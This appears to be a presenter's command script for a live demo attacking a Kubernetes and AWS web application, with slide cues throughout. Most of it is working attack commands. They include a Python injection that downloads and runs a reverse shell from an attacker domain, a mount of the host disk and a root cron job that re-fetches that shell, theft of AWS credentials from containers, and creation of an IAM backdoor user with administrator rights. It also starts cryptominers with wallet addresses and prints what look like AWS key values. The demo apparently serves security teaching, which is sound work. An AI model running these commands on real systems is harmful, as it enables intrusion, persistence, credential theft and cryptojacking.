__import__("subprocess").getoutput("")
command + alt + L = clear screen

kubectl label nodes ip-172-20-63-76.us-west-2.compute.internal demo=node1
kubectl label nodes ip-172-20-50-145.us-west-2.compute.internal demo=node2

-----------------------------------------------------------
Web App Slide #14
------------------------------------------------------------
Attacker goals, profit
    - Find research and development information
    - Transition through the multiple layer using various discovery techniques and lateral movement

The setup
    - As an attacker who as picked a target
        - monitoring for changes in dns, ports and services, certificates, service providers, social media
    - Using "clean" infrastructure for attack
        - Currating hosts
        - Hosting multiple domains with no attack activity to build positive reputation
        - Use exploited infrastructure from other attack
        - We use windowsdefenderpro.net to host our attack tools and command and control

-----------------------------------------------------------
Switch to Browser to show attack site and live ratemydeuce #15
------------------------------------------------------------

-----------------------------------------------------------
Switch to back to slides
------------------------------------------------------------

-----------------------------------------------------------
Initial Compromise Slide #15
------------------------------------------------------------

Multiple avenues to attack, in our case we short cut the process but for the sake of the story let's say our attacker used common discovery techniques to identify a backdoor web interface

-----------------------------------------------------------
Attack Layers #16
------------------------------------------------------------

Challenge of defending the application with multiple attack surfaces
    - web application (compromised via zero day, human error, stolen credentials, repository exposure)
    - microservice architecture
        - virtualization
            pod is virtual machine
            node is like the vm host
            cloud provider (aws, gpc, azure, etc)

Upside to cloud infrastructure
    - logging available at levels unlikely achieved with traditional onprem
    - visibility into all layers

Downside
    - volume of logs each component specific
    - need understanding and context to draw value
    - building event relationship takes observation and summary of a time windows

-----------------------------------------------------------
Compromise - Pod reverse Shell #17
------------------------------------------------------------

-----------------------------------------------------------
Switch to Browser to run attack #17
------------------------------------------------------------

-------------------------------------------------------------

__import__("subprocess").getoutput("ls && whoami")
__import__("subprocess").getoutput("curl -LO https://shell.windowsdefenderpro.net/files/shellx64.elf && chmod 755 shellx64.elf && /bin/sh -c './shellx64.elf &'")

-------------------------------------------------------------

-----------------------------------------------------------
Switch to shell #17
------------------------------------------------------------

sessions 18
ls

-----------------------------------------------------------
Switch to back to slides
------------------------------------------------------------

-----------------------------------------------------------
Microservice map #18
------------------------------------------------------------

-----------------------------------------------------------
Attack Layers #19
------------------------------------------------------------

We have now escape the application context and are running in the context of the pod (virtual machine). 
We'll use this foothold to discover a path to our end goal obtaining sensitive research information.
That won't stop us from finding other paths of profit along the way.

-----------------------------------------------------------
Discovery - Where am i #20
------------------------------------------------------------

-----------------------------------------------------------
Switch to shell
------------------------------------------------------------

shell
cat /etc/hosts \
  && cat /etc/resolv.conf \
  && env && ls -al \
  && whoami

-------------------------------------------------------------

-----------------------------------------------------------
Microservice Map #21
------------------------------------------------------------

We have identified two more targets in our infrastructure (redis and results) 
but we'd like to get some more details and now that we know we know we're in a kubernetes cluster we can use that

-----------------------------------------------------------
Discovery - Kubernetes API #22
------------------------------------------------------------

-----------------------------------------------------------
Switch to Shell #22
------------------------------------------------------------

export KUBELET_READONLY=http://$(tail -1 /etc/hosts | awk '{print $1}' | sed 's/[0-9]*$/1/g'):10255 \
&& curl -X GET ${KUBELET_READONLY}/pods

*** show the results in the cluster.json file ****

-----------------------------------------------------------
Microservice Map #23
------------------------------------------------------------

New discovery Worker, Maintentance DB and we have the credentials, exposed as environment variables

-----------------------------------------------------------
Discovery and lateral movement #24
------------------------------------------------------------

-----------------------------------------------------------
Switch to shell - 24
------------------------------------------------------------

exit (shell session)

-------------------------------------------------------------

####### ALTERNATIVE ########
portfwd add -l 15432 -p 5432 -r db

psql -U postgres -h localhost -p 15432
\dt

psql -U postgres -h localhost -p 15432 -f payload.sql
####### ALTERNATIVE ########


apt-get update && apt-get install -y postgresql-client

export PGPASSWORD='postgres'; psql -h db -U postgres -c "\dt" \
   && export PGPASSWORD='postgres'; psql -h db -U postgres -c "\dt"

-------------------------------------------------------------

*** show new database session and reverse shell ****

-----------------------------------------------------------
Microservice map #25
------------------------------------------------------------

-----------------------------------------------------------
Discovery - Kubernetes API #26
------------------------------------------------------------

- identified a pod with privilege. this give the virtual machine the ability to write through to the host disk

-----------------------------------------------------------
Lateral Movement #27
------------------------------------------------------------

Switch to shell

-----------------------------------------------------------

mkdir -p /mnt/node_filesystem
mount /dev/nvme0n1p1 /mnt/node_filesystem

cat <<'EOF' > /mnt/node_filesystem/var/spool/cron/crontabs/root
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# shell
* * * * * /bin/sh -c "/usr/bin/curl -LO https://shell.windowsdefenderpro.net/files/shellx64.elf && chmod 755 shellx64.elf && ./shellx64.elf"

EOF

chmod 600 /mnt/node_filesystem/var/spool/cron/crontabs/root 
chown 0:105 /mnt/node_filesystem/var/spool/cron/crontabs/root

------------------------------------------------------------

-----------------------------------------------------------
Attack Layers #28-29
------------------------------------------------------------

-----------------------------------------------------------
Discovery - Docker Exec #28-29
------------------------------------------------------------

docker exec -t 0243a4328fe2 /bin/sh -c "cat /root/.aws/credentials"

------------------------------------------------------------

aws sts get-caller-identity
aws s3api list-buckets
aws s3 ls --recursive s3://researchpatents

------------------------------------------------------------

docker run -d --network=host --name minerd_mon mkell43/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u foxbones@protonmail.com -p x
docker run -d --network=host --name minerd_eth mkell43/minerd -a cryptonight -o stratum+tcp://eth.pool.minergate.com:45791 -u foxbones@protonmail.com -p x
docker run -d --network=host --name nicehash_miner a2ncer/nheqminer_cpu:latest -l equihash.usa.nicehash.com:3357 -u 3HotyetPPdD6pyGWtZvmMHLcXxmNuWR53C.worker1

sudo docker stop nicehash_miner

------------------------------------------------------------


AWS_ACCESS_KEY_ID=AKIA35U2TGKSNAJ6MDGH
AWS_SECRET_ACCESS_KEY=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

From attacker:
==============
...setup credentials....

aws sts get-caller-identity
aws s3api list-buckets
aws s3 ls --recursive s3://researchpatents

aws iam create-group --group-name BackupAccessUsers
aws iam attach-group-policy --group-name BackupAccessUsers --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-user --user-name BackupAccess
aws iam add-user-to-group --user BackupAccess --group-name BackupAccessUsers
aws iam create-access-key --user-name BackupAccess

...switch credentials to backupaccess user...

aws s3api list-buckets
aws s3 list --recursive s3://researchpatents

Open PDF:
=========
%%%%%%%%%%%%%% USE LOCAL %%%%%%%%%%%%%%%%%%



1) kube-hunter
https://github.com/aquasecurity/kube-hunter/releases/download/v0.5.0/kube-hunter-linux-x86_64-refs.tags.v0.5.0

2) docker.sock (Docker in docker)
/mnt/node_filesystem/usr/bin/docker -H unix:///mnt/node_filesystem/var/run/docker.sock images
ln -sf /mnt/node_filesystem/var/run/docker.sock /var/run/docker.sock

3) from nodes:
docker exec -t <container name> <any command>
- exec access to any pod?

3) from node:
# as docker container
sudo docker run --rm --name=kubectl --network=host -v /etc/kubelet/:/etc/kubelet -v /etc/kubernetes/:/etc/kubernetes -v /var/lib/kubelet/kubeconfig:/kubeconfig bitnami/kubectl:latest  --kubeconfig=/kubeconfig get pods
sudo docker run --rm --name=kubectl --network=host -v /etc/kubelet/:/etc/kubelet -v /etc/kubernetes/:/etc/kubernetes -v /var/lib/kubelet/kubeconfig:/kubeconfig bitnami/kubectl:1.23.6  --kubeconfig=/kubeconfig get pods

# aws auth 
sudo docker run --rm --name=kubectl --network=host -v /usr/bin/aws-iam-authenticator:/usr/bin/aws-iam-authenticator -v /etc/kubelet/:/etc/kubelet -v /etc/kubernetes/:/etc/kubernetes -v /var/lib/kubelet/kubeconfig:/kubeconfig bitnami/kubectl:1.23.6  --kubeconfig=/kubeconfig get pods
cd ~
mkdir ~/.kube
cp /var/lib/kubelet/kubeconfig ~/.kube/config
curl -LO "https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl"
chmod 755 ~/kubectl 
./kubectl get pods -A
./kubectl get services -A

4) from node run a docker container
docker run --rm lars2893/mobiavote:0.0.1 /bin/sh -c "cat <path to mounted secret>"
docker logs minerd

5) run minerd
docker run -d --network=host --name minerd mkell43/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u foxbones@protonmail.com -p x